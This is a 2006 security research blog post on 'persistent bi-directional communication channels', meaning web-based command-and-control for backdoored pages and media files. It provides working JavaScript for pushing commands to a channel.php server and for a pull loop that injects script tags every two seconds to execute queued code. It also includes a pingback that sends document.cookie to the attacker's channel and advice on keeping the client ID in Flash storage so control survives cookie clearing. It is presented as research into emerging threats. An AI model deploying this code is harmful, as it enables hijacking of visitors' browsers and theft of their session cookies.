---
title: Persistent Bi-directional Communication Channels
author: petko-d-petkov
date: Mon, 02 Oct 2006 04:24:33 GMT
template: post.jade
---

In this article I am planning to cover the essence of the my "Persistent Bi-directional Communication Channels" research and how they can be used to track and control networks of backdoored web client objects. There is also demonstration tool available as well. The tool is written in PHP and can be downloaded from its project page [here](/blog/javascript-attack-channel). First let's have a look at the structure of the HTTP protocol and the theory behind bi-directional communication in stateless protocols in order to understand what these channels are and why they are interesting to study.

HTTP is a stateless protocol. This means that HTTP servers don't know for sure whether the same client is requesting resources from them. The reason for this is quite simple. At the very beginning HTTP was designed to serve static pages only. Dynamic content was added latter and the need for keeping state soon became a problem. Also, there was a problem with users coming from NATed networks. In simple words, there was no easy way to differentiate NATed client requests. That was until cookies were introduced. So eventually "persistence" became synonym for cookies in the HTTP world.

> In addition to that HTTP is no longer stateless. It can be stateful as well and act the same way like other protocols. This is achieved through combination of various HTTP headers that need to be supported by both the server and the client. Also it is worth mentioning that other technologies such as Java and Flash can be used to persist state as well as we will see later in this article.

While persistency is achieved with cookies, bi-directional communication in stateless protocols is achieved with broadcast request handlers. The purpose of these handlers is to route messages. As such client A contacts the request handler to queue a message for client B. Since the server handler keeps state with A and B, the message can be properly routed. The whole idea is quite similar to the one implemented in many well known network routing protocols.

In the HTTP world there is no such thing as broadcast and multicast as in the world of routing protocols but these concepts can be emulated in many different ways. Persistent Bi-directional Communication Channels are simply server side HTTP request handlers that keep state between clients with cookies and communicate with them via message queues and a pulling mechanism. I have seen a lot of different implementations of these channels. Web based instant messengers are some of them. They offer facility to queue messages for others that will be pulled as soon as possible. All this is based on taming mechanisms which makes the process not instant but this is how it is done today in AJAX.

It is very important to understand that instance messaging has some quite powerful characteristic that are widely used today as a mechanism to control malware. The communication channel in use is IRC (stateful) usually but others are possible as well. One of these characteristics is anonymity. Since IRC channels are designed for people to hang out there is no easy way to differentiate which of them are bots and which are humans sitting behind computers.

Web malware cannot use IRC because of practical limitations, however depending how the communication channel is composed, the malware can use web based instant messengers in the same way bots are using IRC channels. However it must be noted that web objects are restricted by a sandbox. Sending information is quite simple. GET or POST can be quite easily achieved in many different ways. Pulling information is not that trivial though. For example using `XMLHttpRequest` and iframe is impossible unless the client originates from the same domain, port and protocol as the channel and that is not practical. Flash used to be the savior in this case but today Flash is restricted by crossdomain.xml which has to be served from the server where the communication channel is located. That again is not practical. The last resort is to use SCRIPT elements. IMHO this is the most functional scenario since SCRIPT elements allow communication in cross domain manner. This technique is widely used today and most people know it as [JSON](http://www.json.org/).

> In summary, every communication channel that persists state with cookies, queues messages for clients and interact with them via [JSON](http://www.json.org/) may be exploited by web malware as prime communication mechanism between masters and zombies in a similar way to IRC.

For testing purposes I constructed a tool that is designed to control backdoored web content and the client that currently previews it. In the second part of this post I will explain what this tool does and how it can be used.

In order to achieve bi-directional communication in persistent fashion my tool makes use of push and pull mechanism via `HTTP GET` requests. Every client is defined by an identifier which in fact corresponds to their session identifier defined by a cookie. Pushing messages is as simple as making a GET request to an URL. For example:

```javascript
var img = new Image();
img.src = 'http://path/to/channel.php?action=push&client=<session_id>&message=alert("Hi There");';
```

The code above queues the message alert("Hi There"); for the client defined by client_id. Once the message is in the queue it has to be pulled. The server cannot just send the message to the client because there is no state. The client defined by client_id has to query the server on regular basis for new messages. For example:

```javascript
setInterval(function () {
	var script = document.createElement('script');
	
	script.src = 'http://path/to/channel.php?action=pull';
	script.differ = true;
	script.type = 'text/javascript';
	
	script.onload = function () {
		document.body.removeChild(script);
	}
	
	document.body.appendChild(script);
}, 2000);
```

Every two second a new request to `http://path/to/channel.php?action=pull` will be made to pull messages stored in the queue. These messages are evaluated as JavaScript. The server recognizes the client via the session cookie stored for it in the browser context. It is also possible to use `http://path/to/channel.php` instead of  http://path/to/channel.php?action=pull since this is the default action that will be executed from `channel.php` server script.

Because clients are recognized by their cookies attackers may want to keep them open for longer. In that respect the server would keep open sessions for more than a year for example. That of course can be set in the tool's configuration section. However, there is one minor problem. Because the session is open for a year there is no direct way to check if clients are available to attack. In order to solve this restriction, attackers can implement pingback mechanism on the top of the communication channel. This can be achieved in the following way:

```javascript
function pingback(session_id) {
	var img = new Image();
	img.src = 'http://path/to/channel.php?action=push&client=' + session_id + '&message=ping_receive("' + document.cookie + '")';
}
```

The function described above needs to be pushed to the client via `channel.php?action=push`. Than the attacker needs to push a call to that function in the same way it was described earlier in this article:

```javascript
var img = new Image();
img.src = 'http://path/to/channel.php?action=push&client=<session_id>&message=pingback("' + document.cookie + '");';
```

If the client is visible the function `ping_receive` will be informed on the attacker's side.

You may have already noticed that the process of pushing and pulling events from the channel abuses standard elements from the XHTML/HTML context. Image objects will result in GET request while SCRIPT elements result in evaluated code from the result body. Instead of writing the same thing all over again, the process can be simplified by creating generic function for example:

```javascript
function push_message(to, message) {
	var img = new Image();
	img.src = 'http://path/to/channel.php?action=push&client=' + to + '&message=' + message + ';
}
```

The code above simplifies the process by wrapping the push functionality in function called `push_message`. This function together with the pulling mechanism described earlier can be part of a malicious payload that a media file is infected with for example.

The need to push functionalities down to clients is inevitable. They can store web based keylogging software, port and network scanners, exploits and other attack scripts. Pushing code every time something needs to be done is not efficient. In this case persistent storage mechanism is required.

I have already discussed this issue in several of my previous post but I will mention it here again. Attackers can push code and save it on the client via the Persistent [Flash Storage Model](http://codinginparadise.org/projects/storage/README.html). This technique provides around 100K storage capabilities that can contain plenty of functionalities in compressed JavaScript format. More over, unaware users cannot trivially delete it. Clearing the cookies will not clear the persistent storage. This mechanism is quite suitable for covert channels or for a storage place where malicious code can be resurrect from upon visit of a malicious domain.

This is very good time to mention that once the infected user clears their cookies the persistent communication will be lost. As I said earlier the process relies on cookies. Since the Persistent Flash Storage Model is not cleared, this is the place where attackers may want to store the session identifier as well and use it in the following way when pulling messages from the message queue.

```javascript
setInterval(function () {
	var script = document.createElement('script');
	
	script.src = 'http://path/to/channel.php?action=pull&client=' + client_id;
	script.differ = true;
	script.type = 'text/javascript';
	
	script.onload = function () {
		document.body.removeChild(script);
	}
	
	document.body.appendChild(script);
}, 2000);
```

The source code above uses client_id as the session identifier that is retrieved from the persistent storage. As long as the affected client has Flash installed the persistent channel will stay open and ready for use.

It is one thing to use Persistent Bi-directional Communication Channels but it is completely different to understand the purposes of this technology. In the third section of this article I will discuss in brief some potential attack vectors that are likely to be exploited in the near future. For more information how to use the tool described in this article please visit its homepage located [here](/blog/javascript-attack-channel).

So how malicious minds can exploit this mechanism in the near future? Some of you may already know the answer to this question. It is definitely possible to construct tools similar to Back Orifice and Subseven but designed to work with the web. Actually, they are easier to construct today. If the channel is suitable for communication and persists state in the desired way all the attacker needs to do is put an AJAX interface on the top of it and the job is done. In fact I have already had one that will become part of [AttackAPI](/blog/attackapi) project in the 0.8 release.

Attackers are also able to exploit not only persistent and non-persistent Cross-site Scripting attacks in popular websites via Cross-site Request Forgery and social engineering but also by altering media content such as [Flash](/blog/backdooring-flash-objects-receipt), [Music](/blog/backdooring-mp3-files) and [Video](/blog/backdooring-quicktime-movies) formats. More over this can be now done from the browser if data URLs are supported. Attackers may not have complete control of your PC for now but they may have in the near future.

If an attacker controls about 100 media files already maliciously infected with the payloads I described earlier in this article and these files are well distributed around the web, they may already have control of your PC by exploiting the browser via IE VML vulnerability or the new Firefox JavaScript engine vulnerability. They are even able to push down to your PC any type of malicious code in distributed fashion. Distributed Denial of Service attacks are also possible and in fact they much easier to construct than one can imagine.

> The big picture is even worse than what I can explain in simple words. Sites such as DIGG, YouTube, MySpace, Google and Google Videos, Del.icio.us and many more will help for this content to get distributed even faster and maybe even reach targets of a high importance (military and government networks, investigation bureaus and VIPs). Although self distribution is now possible via [Google AJAX Search API](/blog/google-search-api-worms) the problem will worsen when people unintentionally help the process as well. This will potentially exploit trust as well in many different ways.
